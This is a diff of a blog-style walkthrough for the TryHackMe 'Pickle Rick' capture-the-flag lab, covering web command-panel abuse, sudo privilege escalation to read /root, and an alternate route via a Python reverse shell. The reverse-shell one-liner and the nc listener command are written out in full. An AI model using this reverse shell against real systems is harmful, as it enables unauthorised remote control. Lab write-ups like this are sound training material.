@@ -12,7 +12,7 @@ image:
 
 This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.  
 
-Deploy the lab machine on this task and explore the web application: MACHINE_IP
+Access TryHackMe lab here: [Pickle_Rick](https://tryhackme.com/room/picklerick)
 
 ## Enumeration
 
@@ -101,7 +101,12 @@ After logging in, we are redirected to `portal.php` with a command panel.
 
 In this specific challenge, the `cat` command does not work properly and it does not display the content of the files correctly and you get error message saying: **Command disabled to make it hard for future PICKLEEE RICCCKKKK**. Also, if I try to access other pages, I get another error message. So, there is no use of trying to access other pages. The only way to find the ingredients is to use the command panel.  
 
-In the command panel, we can execute some commands. Let's try to execute `ls` command to see the files in the current directory. There are several files, let's check the content of **Sup3rS3cretPickl3Ingred.txt** using `less Sup3rS3cretPickl3Ingred.txt` command. We found our first ingredient. There is another file named **clue.txt**. After reading it, I found the content: **Look around the file system for the other ingredient.**  
+In the command panel, we can execute some commands. Let's try to execute `ls` command to see the files in the current directory. 
+
+![List files](/assets/img/pickle-rick/File_list.png)
+
+There are several files, let's check the content of **Sup3rS3cretPickl3Ingred.txt** using `less Sup3rS3cretPickl3Ingred.txt` command. We found our first ingredient.  
+There is another file named **clue.txt**. After reading it, I found the content: **Look around the file system for the other ingredient.**  
 
 Now, run `sudo -l` to check the commands that can be used with current user. And here is the content:
 
@@ -109,18 +114,29 @@ Now, run `sudo -l` to check the commands that can be used with current user. And
 
 This is a very interesting finding. It means that we can run any command as root using sudo without providing a password. Now, we can use this privilege to find the second ingredient.
 
-After trying for few minutes, I found the path to the second ingredient. Run `less '/home/rick/second ingredients` to find the second ingredient. Since `sudo -l` revealed (ALL) NOPASSWD: ALL, I enumerated the **/root** directory and discovered the third ingredient.
+After few tries, I found the path to the second ingredient. Run `less '/home/rick/second ingredients'` to find the second ingredient. Don't forget to use quotes if there are spaces in the file name. If you are confused if certain file is actually a file or a directory, you can use `ls -l` command to check it. If it is a file, you will see a dash (-) at the beginning of the line. If it is a directory, you will see a d at the beginning of the line.  
+
+![Second ingredient](/assets/img/pickle-rick/2nd_ingredient.png)
+
+Since `sudo -l` revealed (ALL) NOPASSWD: ALL, I enumerated the **/root** directory and discovered the third ingredient from the file named **3rd.txt** using `sudo less /root/3rd.txt`.
+
+![Third ingredient](/assets/img/pickle-rick/3rd_ingredient.png)
 
 ## Another way to retrieve the flags
 
-There is another way to retrieve the ingredients without using command panel from the webpage. I checked if python3 is installed, so I used `which python3` to find this: `/usr/bin/python3`  
+There is another way to retrieve the ingredients without using command panel from the webpage. The method is to use remote shell directly from the terminal.    
 
-**Note**: PHP, Python, Bash, Perl, and other interpreters can all be used to establish reverse shells if they are available on the target system and I used Python. You are free to try any other method to get a reverse shell.  
+**Note**: PHP, Python, Bash, Perl, and other interpreters can all be used to establish reverse shells if they are available on the target system. You are free to try any other method to get a reverse shell.  
+
+I tried to use python and immediately checked if python3 is installed, so I used `which python3` to find this: `/usr/bin/python3`.  
 
 Run `nc -lvnp 1234` or any other port number you prefer to listen for incoming connections. Now, run the following command to get a reverse shell.  
 
-Use [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) site to get the python3 reverse shell command. Copy the command, replace the IP_address with your own IP address and preferred port number. The command that I used:  
-`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`.  
+Use [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) site to get the python3 reverse shell command. Copy the command, replace the IP_address with your own attacker_machine IP address and preferred port number. The command that I used is:  
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```  
 
 After executing the command, I got a reverse shell.  
 
@@ -133,6 +149,8 @@ $
 ```
 
 Now, the commands that are used in the command panel can be used in the reverse shell. Also, both `cat` and `less` commands can be used to read the content of files.  
+
+Since the commands that are used in terminal are similar to the commands that are used in the command panel, I just used direct commands to find the ingredients as I know the path of the ingredients.  
 
 Now, follow the below steps to find the ingredients.  
 **First ingredient**  
